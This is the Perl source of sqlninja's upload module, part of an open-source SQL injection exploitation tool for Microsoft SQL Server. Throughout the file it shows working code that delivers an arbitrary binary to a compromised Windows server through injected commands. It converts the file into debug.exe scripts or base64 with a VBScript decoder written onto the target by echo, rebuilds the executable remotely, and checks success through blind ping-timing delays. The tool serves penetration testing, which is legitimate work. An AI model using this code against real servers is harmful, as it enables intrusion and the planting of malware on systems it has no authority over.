# This file is part of sqlninja
# Copyright (C) 2006-2013
# http://sqlninja.sourceforge.net
# icesurfer <r00t@northernfortress.net>
# nico <nico@leidecker.info>
# 
# Sqlninja is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# Sqlninja is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with sqlninja. If not, see <http://www.gnu.org/licenses/>.

use strict;

our $conf;

# upload $_[0] to the remote server
sub upload 
{
	my $scripttype = ($conf->{'uploadmethod'} eq "debug") ? "debug script" : "base64 file";
	if ($conf->{'verbose'} == 1) {
		print "  [v] Starting upload module\n";
	}
	my $file = $_[0];
	if (!(-e $file)) {
		print "[-] ".$file." was not found. Exiting\n";
		exit(1);
	}
	my $rounds; # Number of rounds to upload the file
	my @path = split(/\//,$file);
	my $filename = pop(@path);
	my $filesize = -s $file;
	# split filename and extension, keeping into account multiple extensions
	my @filearray = split(/\./,$filename);
	my $filearraysize = @filearray;
	if ($filearraysize > 2) {
		for (my $i = 1; $i < ($filearraysize-1); $i++) {
			$filearray[0] = $filearray[0].".".$filearray[$i];
		}
		$filearray[1] = $filearray[$filearraysize - 1];
	}
	if ($conf->{'genscript'} == 1) {
		print "[+] -g switch detected. Generating ".$scripttype." only\n";
		# If the file already looks like a debug/base64, probably no point having the -g switch
		if (($conf->{'uploadmethod'} eq "debug") and ($filearray[1] eq "scr") or 
		    ($conf->{'uploadmethod'} eq "vbscript") and ($filearray[1] eq "base64")) {
			print "[-]  ".$file." has already a ".$scripttype." extension. Are you sure you\n".
				"     want to continue? (y/n)";
			my $sure;
			unless (($sure eq "y") or ($sure eq "n")) {
				print "\n> ";
				$sure = <STDIN>;
				chomp($sure);
				if ($sure eq "n") {
					print "\n[-] Exiting....\n";
					exit(0);
				}
			}
		}
		# If vbscript, we don't need to go through the file-splitting pain. So we do it here and exit
		if ($conf->{'uploadmethod'} eq "vbscript") {
			makebase64($file,"/tmp/".$filearray[0].".base64");
			print "[+] /tmp/".$filearray[0].".base64 has been written\n";
			exit(0);
		}
	} else {
		if ($conf->{'verbose'} == 1) {
			print "  [v] Deleting any previous instance of ".$filename."...\n";
		}
		my $cmd = "del ".$conf->{'uploaddir'}."\\".$filearray[0].".*";
		my $command = createcommand($cmd);
		my $result = sendrequest($command);
		# If the file is already in scr format, we assume that the size of the 
		# exe is <64k and just upload it in one go
		if (($conf->{'uploadmethod'} eq "debug") and ($filearray[1] eq "scr") or 
		    ($conf->{'uploadmethod'} eq "vbscript") and ($filearray[1] eq "base64")) {
			print "[+] File is already in ".$scripttype." format. I won't be able to check\n".
		      		"    the correct size of the resulting binary\n";
			uploadrnd($file, 0, -1,$filearray[1]); # -1 means "don't check size!"
			return;
		}
		# If we are using vbscript, Things are simple
		if ($conf->{'uploadmethod'} eq "vbscript") {
			makebase64($file,"/tmp/".$filearray[0].".base64");
			upload_decoder();
			uploadrnd("/tmp/".$filearray[0].".base64", 0, $filesize, $filearray[1]);
			system("rm /tmp/".$filearray[0].".base64");
			return;
		}
	} 
	# If we are here, we were given a binary file and we are using debug.exe
	# Measure file size and calculate how many rounds are needed
	my $rounds = int($filesize / 0xFEFF)+1; # 0x0100 reserved for debug.exe
	if ($rounds == 1) {
		# One round is enough. Create the script, upload it, convert it and exit
		makescr($file,"/tmp/".$filearray[0].".scr");
		if ($conf->{'genscript'} == 0) {
			uploadrnd("/tmp/".$filearray[0].".scr", 0, $filesize, $filearray[1]);
			system("rm /tmp/".$filearray[0].".scr");
		} else {
			print "[+] Debug script created: /tmp/"
				.$filearray[0].".scr\n";
		}
		return;
	}
	print "[+] We need to split the file into ".$rounds." chunks\n";
	# Split the original files in $rounds chunks
	# Upload the various chunks and convert them
	open(FILE, "<".$file);
	binmode FILE;
	my $record;
	for (my $i=1; $i<=$rounds; $i++) {
		read(FILE, $record, 0xFEFF);
		open (OUT, ">/tmp/".$filearray[0].".exe_".$i);
		print OUT $record;
		close OUT;
	}
	for (my $i=1; $i<=$rounds; $i++) {
		my $chunksize = -s "/tmp/".$filearray[0].".exe_".$i;
		makescr("/tmp/".$filearray[0].".exe_".$i,"/tmp/"
						.$filearray[0].".scr_".$i);
		if ($conf->{'genscript'} == 0) {
			uploadrnd("/tmp/".$filearray[0].".scr_".
							$i,$i,$chunksize,$filearray[1]);
			system("rm /tmp/".$filearray[0].".*_".$i);
		} else {
			system("rm /tmp/".$filearray[0].".exe_".$i);
		}
	}
	if ($conf->{'genscript'} == 1) {
		print "[+] Debug scripts created: /tmp/".$filearray[0].
						".scr_X\n";
		exit(0);
	}
	# Glue together the various chunks
	print "[+] Joining the various binary chunks together...\n";
	my $cmd = "copy /b ";
	for (my $i=1; $i<$rounds; $i++) {
		$cmd .= $conf->{'uploaddir'}."\\".$filearray[0].".exe_".$i." +";
	}
	$cmd .= $conf->{'uploaddir'}."\\".$filearray[0].".exe_".$rounds." ".$conf->{'uploaddir'}."\\"
						.$filearray[0].".exe.";
	my $command = createcommand($cmd);
	my $result = sendrequest($command);

	# Check that the final size matches
	print "[+] Checking that the resulting ".$filearray[0].".exe "
						."has the correct size...\n";
	if ($conf->{'verbose'} == 1) {
		print "[v] Expecting it to have ".$filesize." bytes\n";
	}
	my $size_ok = checkremotesize($filearray[0].".exe",$filesize);
	if ($size_ok == 1) {
		print "[+] Filesize corresponds... enjoy! :)\n";
	} else {
		print "[-] Filesize does not correspond. Something went ".
								"wrong\n";
	}
	# Remove chunks
	$cmd = "del ".$conf->{'uploaddir'}."\\".$filearray[0].".exe_*";
	$command = createcommand($cmd);
	$result = sendrequest($command);
}

# Upload and conversion of a single round
sub uploadrnd {
	my $cmd;
	my $command;
	my $result;
	my $file = $_[0];
	my $round = $_[1];
	my $filesize = $_[2];
	my $extension = $_[3];
	my $scripttype = ($conf->{'uploadmethod'} eq "debug") ? "debug script" : "base64 file";
	# print "extension = ".$extension."\n";
	my @path = split(/\//,$file);
	my $filename = pop(@path);
	my @filearray = split(/\./,$filename);
	print "[+] Uploading ".$file." ".$scripttype."............\n";
	open (FILE, $file) || die "can't open file ".$file.": $!";
	my $line;
	my $countlines = 0;
	# Count total lines in the file
	my $totallines;
	while ($line = <FILE>) {
		$totallines++;
	}
	close FILE;

	# Upload the whole script thing
	open (FILE, $file);
#	$line = <FILE>;
#	if ($conf->{'uploadmethod'} eq "debug") {
#		$cmd = "echo n ".$conf->{'uploaddir'}."\\#temp# > ".$conf->{'uploaddir'}."\\".$filename;
#		$command = createcommand($cmd);
#		$result = sendrequest($command);
#		$countlines++;
#		$cmd = "";
#	}
	# First n chunks of script
	for (my $i = 1; $i < int($totallines/$conf->{'lines_per_req'}); $i++) {
		for (my $y=0; $y<($conf->{'lines_per_req'}-1); $y++) {
			$line = <FILE>;
			# goddamned \r's .... >:|
			$line =~ s/\r//g;
			chomp($line);
			$cmd .= "echo ".$line." >> ".$conf->{'uploaddir'}."\\".$filename." && ";
			$countlines++;
		}
		$line = <FILE>;
		$line =~ s/\r//g;
		chomp($line);
		$cmd .= "echo ".$line." >> ".$conf->{'uploaddir'}."\\".$filename;
		$countlines++;
		$command = createcommand($cmd);
		$result = sendrequest($command);
		$cmd = "";
		print $countlines."/".$totallines." lines written       \r";
	}
	# Last chunk
	while ($line = <FILE>) {
		$line =~ s/\r//g;
		chomp($line);
		$cmd = "echo ".$line." >> ".$conf->{'uploaddir'}."\\".$filename;
		$countlines++;
		$command = createcommand($cmd);
		$result = sendrequest($command);
		print $countlines."/".$totallines." lines written       \r"; 
	}
	print $totallines."/".$totallines." lines written         \ndone!\n";
	close FILE;
	
	# Check that the exact number of lines was uploaded
	# We count the lines and store the result in a temporary file, then 
	# we check the last token in that file	
	my $delay;
	my $wrongscr = 0;
	# local $/=\1;
	# local $|=1;
	if ($conf->{'verbose'} == 1) {
		print "[v] Checking number of uploaded lines\n";
	}
	$cmd = "find /v /c \"zzzz\" ".$conf->{'uploaddir'}."\\".$filename." > ".$conf->{'uploaddir'}."\\lines.txt ".
	       "& find \" ".$totallines."\" ".$conf->{'uploaddir'}."\\lines.txt > nul ".
	       "& if not errorlevel = 1 ping -n ".$conf->{'blindtime'}." 127.0.0.1 ".
	       "& del ".$conf->{'uploaddir'}."\\lines.txt";
	$command = createcommand($cmd);
	$delay = tryblind($command);
	if ($delay > ($conf->{'blindtime'}-2)) {
		if ($conf->{'verbose'} == 1) {
			print "[v] ".$filename." seems to have been ".
				"properly uploaded\n";
		}
	} else {
		$wrongscr = 1;
		print "[-] ".$filename." seems not to have been uploaded".
				" correctly.\n";
		print "[-] Checking whether it is there.... ";
		my $present = checkfile("".$conf->{'uploaddir'}."\$filename");
		if ($present == 0) {
			print "no. User has not write privileges?\n";
			exit(1);
		}
		print "yes.\n    You want to count the uploaded lines? (y/n)";
		my $resp="";
		while (($resp ne "y") and ($resp ne "n")) {
			print "\n> ";
			$resp = <STDIN>;
			chomp($resp);
		}
		if ($resp eq "y") {
			checkscrlines($filename,$totallines);
		}
		
		print "[-] You want me to try to create an exe anyway?";
		$resp="";
		while (($resp ne "y") and ($resp ne "n")) {
			print "\n> ";
			$resp = <STDIN>;
			chomp($resp);
		}
		if ($resp eq "n") {
			print "[-] Bye...\n";
			delscr($filename);
			exit(1);
		}
	}
	
	# Generate the binary file
	print "[+] Converting ".$scripttype." to executable... might take a while\n";
	if ($conf->{'uploadmethod'} eq "debug") {
		$cmd = "debug < ".$conf->{'uploaddir'}."\\".$filename;
	} else {
		$cmd = "cscript ".$conf->{'uploaddir'}."\\".$conf->{'vbsdecoder'}." ".$conf->{'uploaddir'}."\\".$filename." ".$conf->{'uploaddir'}."\\#TEMP#";
	}
	$command = createcommand($cmd);
	$result = sendrequest($command);

	# Rename the binary 
	if ($extension eq "scr") {
		print "  Which extension do you want to give the remote file? [Default: exe]\n  > ";
		$extension = <STDIN>;
		chomp($extension);
		if ($extension eq "") {
			$extension = "exe";
		} 
	}
	my $exefile = $filearray[0].".".$extension;
	if ($round > 0) {
		$exefile .= "_".$round;
	}
	$cmd = "ren ".$conf->{'uploaddir'}."\\#TEMP# ".$exefile;
	$command=createcommand($cmd);
	$result = sendrequest($command);
	delscr($filename);
	my $size_ok;	
	# We check whether the exe file has the correct size
	unless ($filesize == -1) {
		print "[+] Checking that ".$exefile." has the expected filesize...\n";
		if ($conf->{'verbose'} == 1) {
			print "[v] Expecting it to have ".$filesize." bytes\n";
		}
		$size_ok = checkremotesize($exefile,$filesize);
		if ($size_ok == 1) {
			print "[+] Filesize corresponds... :)\n";
			return;
		} else {
			print "[-] Filesize does not correspond. Something might be wrong\n";
		}
	}
	# We check whether the exe file is there.... 
	print "[+] Checking whether ".$exefile." is there...\n";
	$cmd = "if exist ".$conf->{'uploaddir'}."\\".$exefile." (ping -n ". $conf->{'blindtime'}." 127.0.0.1)";
	$command = createcommand($cmd);
	$delay = tryblind($command);
	if ($delay > ($conf->{'blindtime'} - 2)) {
		# If we are here, a exe is present....
		# Now let's check that its size is not zero (it can happen
		# if debug.exe fails)
		if ($conf->{'verbose'} == 1) {
			print "[v] Checking whether ".$exefile." is empty\n";
		}
		# Checking whether the exe file is empty
		$size_ok = checkremotesize($exefile,0);
		if ($size_ok == 1) {
			# Check is successful, therefore it's an empty exe
			print "[-] ".$exefile." seems to be there but empty. ". 
       		      		"Debug.exe has probably failed\n";
		} else {
			# Non-empty exe
			if ($filesize == -1) {
				print "[+] ".$exefile." seems to be there :)\n";
			} else {
				print "[-] A ".$exefile." seems to be there... can't be sure will work\n";
			}
		}
			
	} else {
		# If we get here, the exe is not there
		if ($wrongscr == 1) {
			print "[-] ".$exefile." was not found ".
			            "(".$scripttype." corrupted)\n";
		} else {
			print "[-] ".$exefile." was not found ".
		             "(debug.exe or cscript.exe not present?)\n";
		}
	}
}


# Delete the uploaded script file
sub delscr
{
	my $filename = $_[0];
	if ($conf->{'verbose'} == 1) {
		print "[v] Removing the original scr file\n";
	}
	my $cmd = "del ".$conf->{'uploaddir'}."\\".$filename;
	my $command=createcommand($cmd);
	my $result = sendrequest($command);
}

# Count the script uploaded lines
sub checkscrlines
{
	my $filename = $_[0];
	my $lines = $_[1];

	print "[-] Counting uploaded lines... might take a bit\n";
	
	# We start by getting the lines (again...)
	my $cmd = "find /c /v \"zzzzz\" ".$conf->{'uploaddir'}."\\".$filename." > ".
	          $conf->{'uploaddir'}."\\lines.txt";
	my $command=createcommand($cmd);
	my $result = sendrequest($command);

	# Now we find the interval where that number is
	my $min = 0;
	my $max = 0;
	my $candidate = $lines;
	my $delay;
	while ($max == 0) {
		$delay=singlelinescheck($candidate);
		if ($delay > ($conf->{'blindtime'} - 2)) {
			$max = $candidate;
		} else {
			$min = $candidate;
			$candidate = $candidate*2;
		}
	}

	# Now we know that the number is between $min and $max
	if ($conf->{'verbose'} == 1) {
		local $/=\1;
		local $|=1;
		print "Trying... ";
	}
	while ($max != $min) {
		$candidate = int(($max+$min)/2);
		if ($conf->{'verbose'} == 1) {
			local $/=\1;
			local $|=1;
			print $candidate."... ";
		}
		$delay = singlelinescheck($candidate);
		if ($delay > ($conf->{'blindtime'}-2)) {
			$max = $candidate;
		} else {
			$min = $candidate+1;
		}
	}
	if ($conf->{'verbose'} == 1) {
		print "\n";
	}
	print "[-] ".$max." lines were uploaded instead of ".$lines."\n";
	$cmd = "del %TEMP%\\lines.txt";
	my $command=createcommand($cmd);
	my $result = sendrequest($command);
}

# Perform a single check on the number of lines
sub singlelinescheck
{
	my $cmd = "for /F \"tokens=3\" %i in (%TEMP%\\lines.txt) do ".
		     "(if %i LEQ ".$_[0]." ping -n ".$conf->{'blindtime'}." 127.0.0.1)";
	my $command = createcommand($cmd);
	my $delay = tryblind($command);
	return $delay;
}

# Checks whether a file is present on the remote server
sub checkfile
{
	my $file = $_[0];
	my $cmd = "if not exist ".$file." (ping -n ".$conf->{'blindtime'}." 127.0.0.1)";
	my $command = createcommand($cmd);
	my $delay = tryblind($command);
	if ($delay > ($conf->{'blindtime'} - 2)) {
		return 0;
	} else {
		return 1;
	}
}

sub checkremotesize
{
	my $file = $_[0]; # file to check
	my $size = $_[1]; # expected size
	if ($_[1] > 0) {
		$size = add_separators($size);
	}
	# File size can be token 3 or 4 depending on cmd.exe version
	my $cmd = "dir ".$conf->{'uploaddir'}."\\".$file." | ".
             "find \"".$file."\" > ".$conf->{'uploaddir'}."\\xtst.txt & ".
             "for /F \"tokens=3\" \%i in (".$conf->{'uploaddir'}."\\xtst.txt) do ".
             "(if \"\%i\" equ \"".$size."\" ping -n ".$conf->{'blindtime'}." 127.0.0.1)  & ".
	     "for /F \"tokens=4\" \%i in (".$conf->{'uploaddir'}."\\xtst.txt) do ".
	     "(if \"\%i\" equ \"".$size."\" ping -n ".$conf->{'blindtime'}." 127.0.0.1)  & ".
             "del ".$conf->{'uploaddir'}."\\xtst.txt.";
	my $command = createcommand($cmd);
	my $delay = tryblind($command);
	if ($delay > ($conf->{'blindtime'}-2)) {
		return 1;
	} else {
		return 0;
	}
}

# Formats a string by adding a comma to separate each set of 3 digits
# Needed to check filesizes under Windows
# Old version of this function was 15 lines, and buggy.
# This one is 2 lines long, and correct. 
# I suck, and KevinADC rocks :/
sub add_separators
{
	(my $num = shift) =~ s/\G(\d{1,3})(?=(?:\d\d\d)+(?:\.|$))/$1,/g;
	return $num; 
}

# Convert a binary file to its debug script representation
# File must not be larger than 0xFEFF (0xFFFF-0x100) bytes
sub makescr
{
	my $file = $_[0]; # Binary input file
	my $output = $_[1]; # Script output file

	# Here we create the new file, and we set its size in the cx register
	my $script = "n ".$conf->{'uploaddir'}."\\#temp#\nr cx\n";
	my $filesize = -s $file;
	if ($filesize > 65535) {
		die "[-] file is too big for debug.exe\n";
	}
	$filesize = sprintf("%x",$filesize);
	$script .= $filesize."\n";

	# We zero all the memory segment
	$script .= "f 0100 ffff 00\n";

	my $record;
	my @a;
	my $template = "C";
	my $counter = 256; # Position where to write the bytes. 256 = 0x100 :)
	my $counter2 = 0; # Number of consecutive bytes in the current script line
	my $b;
	my $string = "";
	open (FILE, "<".$file);
	# Jussi's algorithm here: we set bytes that are different from zero
	# Each script line sets up to 20 non-zero consecutive bytes
	while (read(FILE,$record,1)) {
		@a = unpack($template,$record);
		foreach (@a)  {
			$b = sprintf("%02x",$_); # byte value in hex
			if ($_ ne "0") {
			$counter2++;
				if ($string eq "") { # Beginning of a new script line
					$string = "e ".sprintf("%x",$counter)." ".$b;
				} else { # We append to the current script line
					$string .= " ".$b;
				}
			} else {
				if ($string ne "") {
					$script .= $string."\n"; # end of current line
					$string = "";
					$counter2 = 0;
				}
			}
		}
		$counter++;
		if ($counter2 == 20) { # reached 20 bytes in the current script line
			$script .= $string."\n";
			$string = "";
			$counter2 = 0;
		}
	}
	# All bytes read.... flush what's left in $string
	if ($string ne "") {
		$script .= $string."\n";
	}
	$script .= "w\nq\n"; # Yay! Write the file and exit
	open (OUT, ">".$output) or die "Can't write to ".$output."\n";
	print OUT $script;
	if ($conf->{'verbose'} == 1) {
	        print "[v] Debug script created successfully\n";
	}
	close FILE;
	close OUT;
}

# makebase64($file,"/tmp/".$filearray[0].".base64");
sub makebase64 {
	my $filein = $_[0];
	my $fileout = $_[1];
	my $buf1 = "";
	my $buf2 = "";
	open (FILE, "<".$filein) or die "Can't read from ".$filein."\n";
	open (OUT, ">".$fileout) or die "Can't write to ".$fileout."\n";
	while (read(FILE, $buf1, 60*57)) {
		$buf2 .= encode_base64($buf1);
	}
	print OUT $buf2;
	if ($conf->{'verbose'} == 1) {
	        print "[v] vbscript created successfully\n";
	}
	close FILE;
	close OUT;
}

# Upload the VBScript decoder
sub upload_decoder
{
	# Check if the decoder is already present
	print_verbose("[v] Checking whether ".$conf->{'vbsdecoder'}." is there.... \n");
	my $present = checkfile("".$conf->{'uploaddir'}."\\".$conf->{'vbsdecoder'});
	if ($present == 1) {
		print_verbose("[v] It is.\n");
		return;
	}
	print("[+] Uploading ".$conf->{'vbsdecoder'}." to ".$conf->{'uploaddir'}."\n");
	# Here's the script. Credits go to rodnower, as I don't know VBScript
	my $decoder = "Set objFSO = CreateObject(\"Scripting.FileSystemObject\")\n".
		      "Set objFileIn = objFSO.GetFile(Wscript.Arguments(0))\n".
		      "Set objStreamIn = objFileIn.OpenAsTextStream(1,0)\n".
		      "Set objXML = CreateObject(\"MSXml2.DOMDocument\")\n".
		      "Set objDocElem = objXML.createElement(\"Base64Data\")\n".
		      "objDocElem.DataType = \"bin.base64\"\n".
		      "objDocElem.text = objStreamIn.ReadAll()\n".
		      "Set objStream = CreateObject(\"ADODB.Stream\")\n".
		      "objStream.Type = 1\n".
		      "objStream.Open()\n".
		      "objStream.Write objDocElem.NodeTypedValue\n".
		      "objStream.SaveToFile Wscript.Arguments(1),2";

	my @decoder_array = split(/\n/,$decoder);
	my $line;
	my $cmd; 
	my $command;
	my $result;
	foreach $line (@decoder_array) {
		chomp($line);
		$cmd = "echo ".$line." >> ".$conf->{'uploaddir'}."\\".$conf->{'vbsdecoder'};
		$command = createcommand($cmd);
		$result = sendrequest($command);
	}
	# Check if the decoder is already present
	print "[+] Checking whether ".$conf->{'vbsdecoder'}." has been successfully uploaded.... \n";
	my $present = checkfile("".$conf->{'uploaddir'}."\\".$conf->{'vbsdecoder'});
	if ($present == 1) {
		print "[+] Success!\n";
	} else {
		print "[+] File not uploaded... exiting\n";
		exit(-1);
	}
}

1;